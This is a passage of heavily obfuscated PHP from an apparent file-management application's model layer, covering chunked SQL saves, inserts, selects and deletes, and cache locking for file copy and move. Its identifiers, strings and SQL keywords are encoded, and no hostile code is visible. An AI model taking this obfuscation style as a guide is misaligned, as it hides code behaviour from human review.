(isset($€´¥‰‘»[$‹¶‰ëùŸ[338]])) { unset($›äÌ¹ş[$€´¥‰‘»[$‹¶‰ëùŸ[338]]]); } foreach ($›äÌ¹ş as $¾ëŞ¶¦¦ => $¤¢¸ú¬) { if (!isset($õ“±’‘»[$¾ëŞ¶¦¦])) { $õ“±’‘»[$¾ëŞ¶¦¦] = $‹¶‰ëùŸ[12]; } } } } private function dataAfterFilter(&$à¡Æ“½µ) { $À¶Î’àğ =& $_SERVER[áäÒ½¯Ç]; foreach ($this->dataAuto as $³‘ÓŞÛ) { $Û”µÉ©± = $³‘ÓŞÛ[0]; if (!isset($à¡Æ“½µ[$Û”µÉ©±])) { continue; } if (!in_array($À¶Î’àğ[442], explode($À¶Î’àğ[50], $³‘ÓŞÛ[2]))) { continue; } switch (trim($³‘ÓŞÛ[3])) { case $À¶Î’àğ[406]: case $À¶Î’àğ[407]: $‰©¸©çƒ = isset($³‘ÓŞÛ[4]) ? (array) $³‘ÓŞÛ[4] : array(); array_unshift($‰©¸©çƒ, $à¡Æ“½µ[$Û”µÉ©±]); if (isset($³‘ÓŞÛ[4]) && $³‘ÓŞÛ[4] == $À¶Î’àğ[463]) { $‰©¸©çƒ = array($à¡Æ“½µ[$Û”µÉ©±]); } if ($À¶Î’àğ[406] == $³‘ÓŞÛ[3]) { $à¡Æ“½µ[$Û”µÉ©±] = call_user_func_array($³‘ÓŞÛ[1], $‰©¸©çƒ); } else { $à¡Æ“½µ[$Û”µÉ©±] = call_user_func_array(array(&$this, $³‘ÓŞÛ[1]), $‰©¸©çƒ); } break; case $À¶Î’àğ[358]: if (isset($à¡Æ“½µ[$Û”µÉ©±]) && $à¡Æ“½µ[$Û”µÉ©±]) { $à¡Æ“½µ[$Û”µÉ©±] = call_user_func_array(array(&$this, $³‘ÓŞÛ[1]), array($à¡Æ“½µ[$Û”µÉ©±])); } break; case $À¶Î’àğ[361]: $à¡Æ“½µ[$Û”µÉ©±] = $à¡Æ“½µ[$³‘ÓŞÛ[1]]; break; case $À¶Î’àğ[379]: $ûº¹¡Û = $à¡Æ“½µ[$Û”µÉ©±]; $ûº¹¡Û = self::textDecode($ûº¹¡Û); $à¡Æ“½µ[$Û”µÉ©±] = json_decode($ûº¹¡Û, !0); if (is_null($à¡Æ“½µ[$Û”µÉ©±])) { $à¡Æ“½µ[$Û”µÉ©±] = $ûº¹¡Û; } break; case $À¶Î’àğ[408]: if ($à¡Æ“½µ[$Û”µÉ©±] === $À¶Î’àğ[12]) { unset($à¡Æ“½µ[$Û”µÉ©±]); } break; case $À¶Î’àğ[409]: $à¡Æ“½µ[$Û”µÉ©±] = $³‘ÓŞÛ[1]; break; default: break; } } } public function saveAll($¤ºÈèÖ, $ÒìÉè¶ = false) { $Ã¿Ø±æ =& $_SERVER[áäÒ½¯Ç]; $»¸¿Â÷ë = $this->db; $»¥ÆÜÆÍ = $this->tablePrefix . $this->tableName; $‡¥‰‚Î = $this->saveAllChunkMake($¤ºÈèÖ); $ÒìÉè¶ = is_array($ÒìÉè¶) ? $ÒìÉè¶ : array(); foreach ($‡¥‰‚Î as $÷‡°Ñ¤í) { $İúÔÏè = $Ã¿Ø±æ[12]; $¥÷£ÅŒÏ = $Ã¿Ø±æ[12]; $¶Úù—«÷ = array(); $®ß„’æˆ = array(); foreach ($÷‡°Ñ¤í as $Éç­ºŞù => $û½§Ü‹÷) { $İúÔÏè = $û½§Ü‹÷[$Ã¿Ø±æ[464]]; $®ß„’æˆ[] = $û½§Ü‹÷[$Ã¿Ø±æ[465]]; $²Ã­©ƒå = $»¸¿Â÷ë->parseValue($û½§Ü‹÷[$Ã¿Ø±æ[465]]); foreach ($û½§Ü‹÷[$Ã¿Ø±æ[466]] as $ˆŞŠÅôü => $ØÛáúŞĞ) { if (!$¶Úù—«÷[$ˆŞŠÅôü]) { $¶Úù—«÷[$ˆŞŠÅôü] = array(); } $¶Úù—«÷[$ˆŞŠÅôü][] = $Ã¿Ø±æ[467] . $²Ã­©ƒå . $Ã¿Ø±æ[468] . $»¸¿Â÷ë->parseValue($ØÛáúŞĞ); } } $ä«éÇš¦ = $İúÔÏè; $ä«éÇš¦ = $»¸¿Â÷ë->parseKey($ä«éÇš¦); foreach ($¶Úù—«÷ as $ˆŞŠÅôü => $úØÆ½‰Ú) { $¥÷£ÅŒÏ .= $Ã¿Ø±æ[221] . $»¸¿Â÷ë->parseKey($ˆŞŠÅôü) . $Ã¿Ø±æ[469] . $ä«éÇš¦ . $Ã¿Ø±æ[470]; $¥÷£ÅŒÏ .= implode($Ã¿Ø±æ[221], $úØÆ½‰Ú) . $Ã¿Ø±æ[471]; } $—ûåÀˆ½ = $ÒìÉè¶; $—ûåÀˆ½[$İúÔÏè] = array($Ã¿Ø±æ[7], $®ß„’æˆ); $»šıŞ‚÷ = "\125\x50\x44\101\x54\x45\40\x60{$»¥ÆÜÆÍ}\x60\x20\x53\x45\x54\40" . rtrim($¥÷£ÅŒÏ, $Ã¿Ø±æ[50]) . $Ã¿Ø±æ[221] . $»¸¿Â÷ë->parseWhere($—ûåÀˆ½); $this->execute($»šıŞ‚÷); $this->chunkEventCheck(count($÷‡°Ñ¤í)); } $this->chunkEventSet(); } public function saveAllEach($™Íºµ¿´, $„œìµï¶ = false) { $æ¸ó‘ŒË =& $_SERVER[áäÒ½¯Ç]; $íÛ›Í©Š = $this->db; $ÇÎÛ‚·‘ = $this->tablePrefix . $this->tableName; $‚£‡›¬ = $this->saveAllChunkMake($™Íºµ¿´); $„œìµï¶ = is_array($„œìµï¶) ? $„œìµï¶ : array(); foreach ($‚£‡›¬ as $ÃÑ¬ûöĞ) { foreach ($ÃÑ¬ûöĞ as $Âåá©Ü => $İñ–µ¢¼) { $ìù¥Éºõ = $æ¸ó‘ŒË[472]; foreach ($İñ–µ¢¼[$æ¸ó‘ŒË[466]] as $üà×÷à => $î‚÷ºƒı) { $ìù¥Éºõ .= $íÛ›Í©Š->parseKey($üà×÷à) . $æ¸ó‘ŒË[473] . $íÛ›Í©Š->parseValue($î‚÷ºƒı) . $æ¸ó‘ŒË[50]; } $Äï“ö»¨ = $„œìµï¶; $Äï“ö»¨[$İñ–µ¢¼[$æ¸ó‘ŒË[464]]] = $İñ–µ¢¼[$æ¸ó‘ŒË[465]]; $¨©Î™§ç = "\125\120\x44\x41\x54\105\x20\140{$ÇÎÛ‚·‘}\x60\40\x53\x45\124\x20" . rtrim($ìù¥Éºõ, $æ¸ó‘ŒË[50]) . $æ¸ó‘ŒË[474] . $íÛ›Í©Š->parseWhere($Äï“ö»¨) . $æ¸ó‘ŒË[475]; $this->execute($¨©Î™§ç); } $this->chunkEventCheck(count($ÃÑ¬ûöĞ)); } $this->chunkEventSet(); } private function saveAllChunkMake($ÕúËö¶³) { $ĞÑ¼¼¾ì =& $_SERVER[áäÒ½¯Ç]; $ÜßÆĞçé = self::SQL_WHERE_IN_CHUNK; $ÕúËö¶³ = is_array($ÕúËö¶³) ? $ÕúËö¶³ : array(); $Ì©ÊÂµ¸ = array(); $©Â›­µ = ceil(count($ÕúËö¶³) / $ÜßÆĞçé); for ($É–ßÚ‡ = 0; $É–ßÚ‡ < $©Â›­µ; $É–ßÚ‡++) { $æ×‘•âÌ = array(); $ª—¡ºéï = array_slice($ÕúËö¶³, $É–ßÚ‡ * $ÜßÆĞçé, $ÜßÆĞçé); foreach ($ª—¡ºéï as $¼°äü¥) { if (!is_array($¼°äü¥) || count($¼°äü¥) < 4 || count($¼°äü¥) % 2 != 0) { continue; } $ªãŞÕÉÈ = array(); for ($Çæí¾Ú† = 2; $Çæí¾Ú† < count($¼°äü¥); $Çæí¾Ú† += 2) { $ªãŞÕÉÈ[$¼°äü¥[$Çæí¾Ú†]] = $¼°äü¥[$Çæí¾Ú† + 1]; } $æ×‘•âÌ[] = array($ĞÑ¼¼¾ì[464] => $¼°äü¥[0], $ĞÑ¼¼¾ì[465] => $¼°äü¥[1], $ĞÑ¼¼¾ì[466] => $ªãŞÕÉÈ); } $Ì©ÊÂµ¸[] = $æ×‘•âÌ; } return $Ì©ÊÂµ¸; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($–ü£®ø‘ = false, $¤Îƒ’•ø = false) { $this->_chunkEvent = $–ü£®ø‘; $this->_chunkEventParam = $¤Îƒ’•ø; } private function chunkEventCheck($İÜÁ‰îÜ) { if (!$this->_chunkEvent) { return; } $õÃÉ ûÖ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $õÃÉ ûÖ[$_SERVER[áäÒ½¯Ç][476]] = $İÜÁ‰îÜ; Hook::trigger($this->_chunkEvent, $õÃÉ ûÖ); } public function addAll($‡Ì¯æøú, $öü™úï° = array(), $²··…ñï = false) { $•Øù¥Á· =& $_SERVER[áäÒ½¯Ç]; ignore_timeout(); $á€£Ë–ì = self::SQL_WHERE_IN_CHUNK; if (empty($‡Ì¯æøú)) { $this->error = think_lang($•Øù¥Á·[359]); return !1; } $öü™úï° = $this->_parseOptions($öü™úï°); foreach ($‡Ì¯æøú as $¯‰’¸Ã³ => $‰Ò¶÷æà) { $‡Ì¯æøú[$¯‰’¸Ã³] = $this->_facade($‰Ò¶÷æà); $this->_beforeInsert($‡Ì¯æøú[$¯‰’¸Ã³], $öü™úï°); } if (method_exists($this->db, $•Øù¥Á·[360])) { for ($şç´áıŞ = 0; $şç´áıŞ < count($‡Ì¯æøú); $şç´áıŞ += $á€£Ë–ì) { $´ÍõÕ€® = array_slice($‡Ì¯æøú, $şç´áıŞ, $á€£Ë–ì); if (!is_array($´ÍõÕ€®) || count($´ÍõÕ€®) == 0) { break; } $¢“ë¹í = $this->db->insertAll($´ÍõÕ€®, $öü™úï°, $²··…ñï); $this->chunkEventCheck(count($´ÍõÕ€®)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($‡Ì¯æøú as $¯‰’¸Ã³ => $‰Ò¶÷æà) { $¢“ë¹í = $this->db->insert($‰Ò¶÷æà, $öü™úï°, $²··…ñï); } $this->commit(); } if (!1 !== $¢“ë¹í) { $“§ë§í¼ = $this->getLastInsID(); if ($“§ë§í¼) { return $“§ë§í¼; } } return $¢“ë¹í; } public function save($Êæ÷Öâó = '', $ËÍïÆ… = array()) { $†´Ûš£Ş =& $_SERVER[áäÒ½¯Ç]; $“Á»úÎ = self::SQL_WHERE_IN_CHUNK; $ÈÒ£‡æ = $this->optionsValue(); $Š—­Şì¨ = $this->findWhereField($ÈÒ£‡æ); if (!$Š—­Şì¨) { return parent::save($Êæ÷Öâó, $ËÍïÆ…); } $û¹ğÑ—í = 0; $ªßÈˆÜ = $ÈÒ£‡æ[$†´Ûš£Ş[363]][$Š—­Şì¨][1]; $ªßÈˆÜ = is_array($ªßÈˆÜ) ? $ªßÈˆÜ : array(); $ŠÇĞ‡áÕ = count($ªßÈˆÜ); for ($‹ıï«Ã = 0; $‹ıï«Ã < $ŠÇĞ‡áÕ; $‹ıï«Ã += $“Á»úÎ) { $áÅ›œÏƒ = array_slice($ªßÈˆÜ, $‹ıï«Ã, $“Á»úÎ); if (!is_array($áÅ›œÏƒ) || count($áÅ›œÏƒ) == 0) { break; } $ÈÒ£‡æ[$†´Ûš£Ş[363]][$Š—­Şì¨][1] = $áÅ›œÏƒ; $this->optionsValue($ÈÒ£‡æ); $û¹ğÑ—í += parent::save($Êæ÷Öâó, $ËÍïÆ…); $this->chunkEventCheck(count($áÅ›œÏƒ)); } $this->chunkEventSet(); return $û¹ğÑ—í; } public function add($Â°ŒŞ®Ñ = '', $îœÖŞÆÌ = array(), $¢«Ï«±è = false) { if ($this->addTaskStatus && is_array($Â°ŒŞ®Ñ)) { $this->addTaskData[] = $Â°ŒŞ®Ñ; return; } return parent::add($Â°ŒŞ®Ñ, $îœÖŞÆÌ, $¢«Ï«±è); } public function parseWhereLike($©áÜ†ã¨, $ğ¨â = '', $ğò±ö‡õ = false, &$ßÖÓÜñ„ = false) { $¬Ğ¶Éº´ =& $_SERVER[áäÒ½¯Ç]; $¦Ô„ –÷ = $GLOBALS[$¬Ğ¶Éº´[6]][$¬Ğ¶Éº´[477]]; if (!$¦Ô„ –÷[$¬Ğ¶Éº´[478]]) { return $©áÜ†ã¨; } if (!is_array($©áÜ†ã¨)) { return $©áÜ†ã¨; } $ˆÖ¼¼íÚ = array(); $Ï„Éá˜Ì = 0; foreach ($©áÜ†ã¨ as $óÌ¥ÎÌ => $Â¤·¦³) { if (is_array($Â¤·¦³) && count($Â¤·¦³) == 2 && $Â¤·¦³[0] == $¬Ğ¶Éº´[479] && is_string($Â¤·¦³[1]) && substr($Â¤·¦³[1], 0, 1) == $¬Ğ¶Éº´[480] && substr($Â¤·¦³[1], strlen($Â¤·¦³[1]) - 1, 1) == $¬Ğ¶Éº´[480]) { $ßÖÓÜñ„ = !0; $±®“§û¿ = is_string($óÌ¥ÎÌ) ? $óÌ¥ÎÌ : $ğ¨â; $û…×í”— = substr($Â¤·¦³[1], 1, strlen($Â¤·¦³[1]) - 2); $û…×í”— = $this->db->escapeString($û…×í”—); if (!strpos($±®“§û¿, $¬Ğ¶Éº´[10])) { $±®“§û¿ = $¬Ğ¶Éº´[481] . $±®“§û¿ . $¬Ğ¶Éº´[481]; } $ƒ¨àû¹‰ = $¬Ğ¶Éº´[231] . $û…×í”— . $¬Ğ¶Éº´[231]; $û…×í”— = str_replace(array($¬Ğ¶Éº´[10], $¬Ğ¶Éº´[482], $¬Ğ¶Éº´[11]), $¬Ğ¶Éº´[483], $û…×í”—); if ($¦Ô„ –÷[$¬Ğ¶Éº´[484]]) { $ƒ¨àû¹‰ = $¬Ğ¶Éº´[485] . $û…×í”— . $¬Ğ¶Éº´[486]; if ($¦Ô„ –÷[$¬Ğ¶Éº´[487]]) { $ƒ¨àû¹‰ = $¬Ğ¶Éº´[486] . $û…×í”— . $¬Ğ¶Éº´[485]; } } $ˆÖ¼¼íÚ[$Ï„Éá˜Ì] = $¬Ğ¶Éº´[488] . $±®“§û¿ . $¬Ğ¶Éº´[489] . $ƒ¨àû¹‰ . $¬Ğ¶Éº´[490]; $Ï„Éá˜Ì++; continue; } if (is_array($Â¤·¦³)) { $ğ¨â = is_string($óÌ¥ÎÌ) ? $óÌ¥ÎÌ : $ğ¨â; $Â¤·¦³ = $this->parseWhereLike($Â¤·¦³, $ğ¨â, !0, $ßÖÓÜñ„); } if (is_numeric($óÌ¥ÎÌ)) { $ˆÖ¼¼íÚ[$Ï„Éá˜Ì] = $Â¤·¦³; $Ï„Éá˜Ì++; } else { $ˆÖ¼¼íÚ[$óÌ¥ÎÌ] = $Â¤·¦³; } } if ($ßÖÓÜñ„ && !$ğò±ö‡õ) { } return $ˆÖ¼¼íÚ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Àî»ú½ó = array()) { $ë÷Ôûˆû =& $_SERVER[áäÒ½¯Ç]; $ò½åÚ¼ = self::SQL_WHERE_IN_CHUNK; $Ä•Ç‘Ê• = $this->optionsValue(); $™ÇÕµÛ = $this->findWhereField($Ä•Ç‘Ê•); if (!$™ÇÕµÛ || isset($Ä•Ç‘Ê•[$ë÷Ôûˆû[378]]) || isset($Ä•Ç‘Ê•[$ë÷Ôûˆû[438]])) { return parent::select($Àî»ú½ó); } $¸ÊßÉÃ = $Ä•Ç‘Ê•[$ë÷Ôûˆû[363]][$™ÇÕµÛ][1]; $¸ÊßÉÃ = is_array($¸ÊßÉÃ) ? $¸ÊßÉÃ : array(); $å¢ÂØ¶Ş = null; for ($Ëõ³å¡’ = 0; $Ëõ³å¡’ < count($¸ÊßÉÃ); $Ëõ³å¡’ += $ò½åÚ¼) { $õÕ¿˜ü• = array_slice($¸ÊßÉÃ, $Ëõ³å¡’, $ò½åÚ¼); if (!is_array($õÕ¿˜ü•) || count($õÕ¿˜ü•) == 0) { break; } $Ä•Ç‘Ê•[$ë÷Ôûˆû[363]][$™ÇÕµÛ][1] = $õÕ¿˜ü•; $this->optionsValue($Ä•Ç‘Ê•); $ï…¦¯¹á = parent::select($Àî»ú½ó); if (!$ï…¦¯¹á) { continue; } $å¢ÂØ¶Ş = is_array($å¢ÂØ¶Ş) ? $å¢ÂØ¶Ş : array(); $å¢ÂØ¶Ş = array_merge($å¢ÂØ¶Ş, $ï…¦¯¹á); } return $å¢ÂØ¶Ş; } public function delete($à¼‘úÃ£ = array()) { $ßˆî®¨ =& $_SERVER[áäÒ½¯Ç]; $¬€Øô¡ = self::SQL_WHERE_IN_CHUNK; $»İëûß = $this->optionsValue(); $åÏóé›™ = $this->findWhereField($»İëûß); if (!$åÏóé›™) { return parent::delete($à¼‘úÃ£); } $Ìß±ÔÓ§ = 0; $“Ä€¡Ú“ = $»İëûß[$ßˆî®¨[363]][$åÏóé›™][1]; $“Ä€¡Ú“ = is_array($“Ä€¡Ú“) ? $“Ä€¡Ú“ : array(); for ($Ûªş®º = 0; $Ûªş®º < count($“Ä€¡Ú“); $Ûªş®º += $¬€Øô¡) { $úù‡€¥¦ = array_slice($“Ä€¡Ú“, $Ûªş®º, $¬€Øô¡); if (!is_array($úù‡€¥¦) || count($úù‡€¥¦) == 0) { break; } $»İëûß[$ßˆî®¨[363]][$åÏóé›™][1] = $úù‡€¥¦; $this->optionsValue($»İëûß); $Ìß±ÔÓ§ += parent::delete($à¼‘úÃ£); } return $Ìß±ÔÓ§; } private function findWhereField($íåŠäõ) { $àˆ´ã—Ç =& $_SERVER[áäÒ½¯Ç]; $“‡åš¾ = self::SQL_WHERE_IN_CHUNK; if (!is_array($íåŠäõ) || !is_array($íåŠäõ[$àˆ´ã—Ç[363]])) { return !1; } foreach ($íåŠäõ[$àˆ´ã—Ç[363]] as $åÒ›´”˜ => $ëáÀÕúÉ) { if (is_array($ëáÀÕúÉ) && isset($ëáÀÕúÉ[0]) && is_string($ëáÀÕúÉ[0]) && strtolower($ëáÀÕúÉ[0]) == $àˆ´ã—Ç[7] && is_array($ëáÀÕúÉ[1]) && count($ëáÀÕúÉ[1]) > $“‡åš¾) { ignore_timeout(); return $åÒ›´”˜; } } return !1; } public function setMasterDB($È‰šô»‡ = true) { think_config($_SERVER[áäÒ½¯Ç][491], $È‰šô»‡); } } goto D©ïóóõï; fŸÅ‘™ğ˜Î: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ğ¤ÙóŒ) { $Åî»º­ñ =& $_SERVER[áäÒ½¯Ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($Åî»º­ñ[646], $ğ¤ÙóŒ); $‘ç½²‡× = 1; $this->_lockEvent($ğ¤ÙóŒ, array($Åî»º­ñ[647], $Åî»º­ñ[648]), $‘ç½²‡×); $this->_lockParent($ğ¤ÙóŒ, array($Åî»º­ñ[648]), $‘ç½²‡×); $this->_lockEvent($ğ¤ÙóŒ, array($Åî»º­ñ[649], $Åî»º­ñ[650]), $‘ç½²‡×); $this->_lockCheckEnd($Åî»º­ñ[646], $ğ¤ÙóŒ); } public function lockCopyEnd($„¬©âç˜) { $“©ºÍë =& $_SERVER[áäÒ½¯Ç]; if (!$this->allowLock()) { return; } $¹£–ò§ = 0; $this->_lockEvent($„¬©âç˜, array($“©ºÍë[647], $“©ºÍë[648]), $¹£–ò§); $this->_lockParent($„¬©âç˜, array($“©ºÍë[648]), $¹£–ò§); $this->_lockEvent($„¬©âç˜, array($“©ºÍë[649], $“©ºÍë[650]), $¹£–ò§); } public function lockWriteStart($÷ö¦±º†, $•×ˆ±÷ = '') { $åÑ†æ’ =& $_SERVER[áäÒ½¯Ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($åÑ†æ’[647], $÷ö¦±º†); $êãÖ©›Ã = 1; $this->_lockKey($åÑ†æ’[651] . $÷ö¦±º† . $åÑ†æ’[10] . $•×ˆ±÷, $êãÖ©›Ã); $this->_lockEvent($÷ö¦±º†, array($åÑ†æ’[646], $åÑ†æ’[648]), $êãÖ©›Ã); $this->_lockParent($÷ö¦±º†, array($åÑ†æ’[646], $åÑ†æ’[648]), $êãÖ©›Ã); $this->_lockCheckEnd($åÑ†æ’[647], $÷ö¦±º†); } public function lockWriteEnd($¿»œºÚÍ, $ÃùŞÜáş = '') { $şûªéœ =& $_SERVER[áäÒ½¯Ç]; if (!$this->allowLock()) { return; } $¿áóòØƒ = 0; $this->_lockKey($şûªéœ[651] . $¿»œºÚÍ . $şûªéœ[10] . $ÃùŞÜáş, $¿áóòØƒ); $this->_lockEvent($¿»œºÚÍ, array($şûªéœ[646], $şûªéœ[648]), $¿áóòØƒ); $this->_lockParent($¿»œºÚÍ, array($şûªéœ[646], $şûªéœ[648]), $¿áóòØƒ); } public function lockMoveStart($×ƒÌ—¸) { $îª¿´‚Š =& $_SERVER[áäÒ½¯Ç]; if (!$this->allowLock()) { return; } $this->_lockCheck($îª¿´‚Š[648], $×ƒÌ—¸); $·­õ¬“ = 1; $this->_lockKey($îª¿´‚Š[652] . $×ƒÌ—¸, $·­õ¬“); $this->_lockEvent($×ƒÌ—¸, array($îª¿´‚Š[646], $îª¿´‚Š[647]), $·­õ¬“); $this->_lockParent($×ƒÌ—¸, array($îª¿´‚Š[646], $îª¿´‚Š[648]), $·­õ¬“); $this->_lockEvent($×ƒÌ—¸, array($îª¿´‚Š[653], $îª¿´‚Š[649], $îª¿´‚Š[650]), $·­õ¬“); $this->_lockCheckEnd($îª¿´‚Š[648], $×ƒÌ—¸); } public function lockMoveEnd($±÷ßÆ¾ƒ) { $´ÖÁ¶äš =& $_SERVER[áäÒ½¯Ç]; if (!$this->allowLock()) { return; } $˜‡³¡Ú© = 0; $this->_lockKey($´ÖÁ¶äš[652] . $±÷ßÆ¾ƒ, $˜‡³¡Ú©); $this->_lockEvent($±÷ßÆ¾ƒ, array($´ÖÁ¶äš[646], $´ÖÁ¶äš[647]), $˜‡³¡Ú©); $this->_lockParent($±÷ßÆ¾ƒ, array($´ÖÁ¶äš[646], $´ÖÁ¶äš[648]), $˜‡³¡Ú©); $this->_lockEvent($±÷ßÆ¾ƒ, array($´ÖÁ¶äš[653], $´ÖÁ¶äš[649], $´ÖÁ¶äš[650]), $˜‡³¡Ú©); } private function _lockCheck($®À¸Ò‹İ, $×á”Ë±) { $ˆ½µÙ©Ş =& $_SERVER[áäÒ½¯Ç]; $ŞĞÙØË = $this->sourceInfo($×á”Ë±); $™–®ğ€— = $®À¸Ò‹İ . $ˆ½µÙ©Ş[10] . $×á”Ë±; $this->_lockTimeStart[$™–®ğ€—] = timeFloat(); if (!is_array($ŞĞÙØË)) { return; } $—»ºóÄì = LNG($ˆ½µÙ©Ş[654]); CacheLock::setErrorMsg($ˆ½µÙ©Ş[174] . htmlspecialchars($ŞĞÙØË[$ˆ½µÙ©Ş[32]]) . $ˆ½µÙ©Ş[176] . $—»ºóÄì); $this->_lockKey($™–®ğ€—, 1); $this->_lockKey($™–®ğ€—, 0); $Ş¢Š…¦¨ = array_reverse($this->parentLevelArray($ŞĞÙØË[$ˆ½µÙ©Ş[609]])); foreach ($Ş¢Š…¦¨ as $—¶•—°Ü) { $™–®ğ€— = $®À¸Ò‹İ . $ˆ½µÙ©Ş[655] . $—¶•—°Ü; if (CacheLock::lockGet($ˆ½µÙ©Ş[656] . $™–®ğ€—)) { $ŞĞÙØË = $this->sourceInfo($—¶•—°Ü); CacheLock::setErrorMsg($ˆ½µÙ©Ş[174] . htmlspecialchars($ŞĞÙØË[$ˆ½µÙ©Ş[32]]) . $ˆ½µÙ©Ş[176] . $—»ºóÄì); $this->_lockKey($™–®ğ€—, 1); $this->_lockKey($™–®ğ€—, 0); } } } private function _lockCheckEnd($±»§ª¦ğ, $›Û‚ã€) { $„‹²Ø =& $_SERVER[áäÒ½¯Ç]; $ÚÃ²Û×ü = $±»§ª¦ğ . $„‹²Ø[10] . $›Û‚ã€; CacheLock::setErrorMsg($„‹²Ø[472]); if (!isset($this->_lockTimeStart[$ÚÃ²Û×ü])) { return; } $ŞÓï¨°ˆ = timeFloat() - $this->_lockTimeStart[$ÚÃ²Û×ü]; unset($this->_lockTimeStart[$ÚÃ²Û×ü]); if ($ŞÓï¨°ˆ > 0.5) { unset(self::$cacheSourceInfo[$„‹²Ø[552] . $›Û‚ã€]); } $äíßÈÕÄ = $this->sourceInfo($›Û‚ã€); if (!$äíßÈÕÄ) { show_json(LNG($„‹²Ø[106]), !1); } } private function _lockParent($’ŸÂÓÒÑ, $÷³¡ıé•, $áÈõÓã) { if (!$this->autoLockSet) { return; } $‡°ÑÚÆî = $this->sourceInfo($’ŸÂÓÒÑ); if (!is_array($‡°ÑÚÆî)) { return; } $Æ¼¸ôÈ = array_reverse($this->parentLevelArray($‡°ÑÚÆî[$_SERVER[áäÒ½¯Ç][609]])); foreach ($Æ¼¸ôÈ as $ìŠÇ­ˆÂ) { $this->_lockEvent($ìŠÇ­ˆÂ, $÷³¡ıé•, $áÈõÓã); } } private function _lockEvent($áÒ¶ŒüÈ, $²˜ûÁ÷, $Ùûğ±…Ô) { $ÛÊú‚ú =& $_SERVER[áäÒ½¯Ç]; if (!$this->autoLockSet) { return; } foreach ($²˜ûÁ÷ as $–¸˜§×Ñ) { $®âš’°Œ = $–¸˜§×Ñ . $ÛÊú‚ú[10] . $áÒ¶ŒüÈ; if ($Ùûğ±…Ô && CacheLock::lockGet($ÛÊú‚ú[656] . $®âš’°Œ)) { continue; } $this->_lockKey($®âš’°Œ, $Ùûğ±…Ô); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($€éª÷éú, $àê˜¥æğ = 1) { $˜ûˆâõÍ = $_SERVER[áäÒ½¯Ç][656] . md5($€éª÷éú); if ($àê˜¥æğ) { if (isset(self::$_lockItemArr[$˜ûˆâõÍ])) { return; } self::$_lockItemArr[$˜ûˆâõÍ] = 1; CacheLock::lock($˜ûˆâõÍ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$˜ûˆâõÍ])) { return; } unset(self::$_lockItemArr[$˜ûˆâõÍ]); CacheLock::unlock($˜ûˆâõÍ); } } public function isParentOf($õÓàä›«, $ÓæÚ¸Á) { $°ÃëÆ•Ñ =& $_SERVER[áäÒ½¯Ç]; $£Ì„›òµ = $this->sourceInfo($õÓàä›«); $Ÿ¦É‘‡ = $this->sourceInfo($ÓæÚ¸Á); $¬‡õè¾ô = $£Ì„›òµ[$°ÃëÆ•Ñ[609]] . $£Ì„›òµ[$°ÃëÆ•Ñ[192]] . $°ÃëÆ•Ñ[50]; $İõÓÂ†· = $Ÿ¦É‘‡[$°ÃëÆ•Ñ[609]] . $Ÿ¦É‘‡[$°ÃëÆ•Ñ[192]] . $°ÃëÆ•Ñ[50]; $ø˜åüş§ = strpos($İõÓÂ†·, $¬‡õè¾ô) === 0; return $ø˜åüş§; } private $targetIsDelete = 0; public function copy($ÇáµåâŒ, $ÌÀÁîŒ‹, $ïëüæÃÀ = REPEAT_REPLACE, $å¡Òñ‰• = '') { $èÊáú¶ =& $_SERVER[áäÒ½¯Ç]; $ŸÜ‚»Ê = $this->sourceInfo($ÇáµåâŒ); $Ã§Š©”å = $this->sourceInfo($ÌÀÁîŒ‹); if (!$ŸÜ‚»Ê || !$Ã§Š©”å || $Ã§Š©”å[$èÊáú¶[505]] != $èÊáú¶[91]) { return !1; } if ($this->isParentOf($ÇáµåâŒ, $ÌÀÁîŒ‹)) { return !1; } $á²ƒ¼ù = $å¡Òñ‰• ? $å¡Òñ‰• : $ŸÜ‚»Ê[$èÊáú¶[32]]; $this->lockCopyStart($ÇáµåâŒ); $this->lockWriteStart($ÌÀÁîŒ‹, $á²ƒ¼ù); $¥®õ³Æ = array($èÊáú¶[657] => array(), $èÊáú¶[658] => array(), $èÊáú¶[659] => array()); $this->targetIsDelete = intval($ŸÜ‚»Ê[$èÊáú¶[525]]); $ÊóÈµò = $this->fileNameExistAuto($ÌÀÁîŒ‹, $ŸÜ‚»Ê); $ßç¨‘‘ = $this->_copy($ÇáµåâŒ, $ÌÀÁîŒ‹, $ïëüæÃÀ, $¥®õ³Æ, !0, $å¡Òñ‰•); $this->_childrenListClear(); $this->lockCopyEnd($ÇáµåâŒ); $this->lockWriteEnd($ÌÀÁîŒ‹, $á²ƒ¼ù); if ($ŸÜ‚»Ê[$èÊáú¶[505]] == $èÊáú¶[91] && $ÊóÈµò == $ßç¨‘‘) { $this->folderSizeResetChildren($ÊóÈµò); } Model($èÊáú¶[660])->addAll($¥®õ³Æ[$èÊáú¶[658]], array(), !0); if ($ÊóÈµò != $ßç¨‘‘ || $ŸÜ‚»Ê[$èÊáú¶[505]] == $èÊáú¶[91]) { Model($èÊáú¶[661])->eventCopy($ßç¨‘‘); } $this->saveAll($¥®õ³Æ[$èÊáú¶[659]]); Model($èÊáú¶[241])->linkAdd($¥®õ³Æ[$èÊáú¶[657]]); $this->folderSizeReset($ÌÀÁîŒ‹); $this->updateModifyTime($ÌÀÁîŒ‹); return $ßç¨‘‘; } private function _copy($†ê« ™Ú, $•á÷ìİ¬, $ÂÅÁË§, &$ì£ßëş¾, $ñµİùõ÷, $ÚÅ¡…â¹ = '') { $¦æÃ‹®» =& $_SERVER[áäÒ½¯Ç]; $½îÖİ = $this->sourceInfoCache($†ê« ™Ú); $‘ø¶ûƒ½ = $½îÖİ[$¦æÃ‹®»[505]] == $¦æÃ‹®»[91]; $òì¬ó®£ = $ÚÅ¡…â¹ ? $ÚÅ¡…â¹ : $½îÖİ[$¦æÃ‹®»[32]]; $ŒÏÙìß = 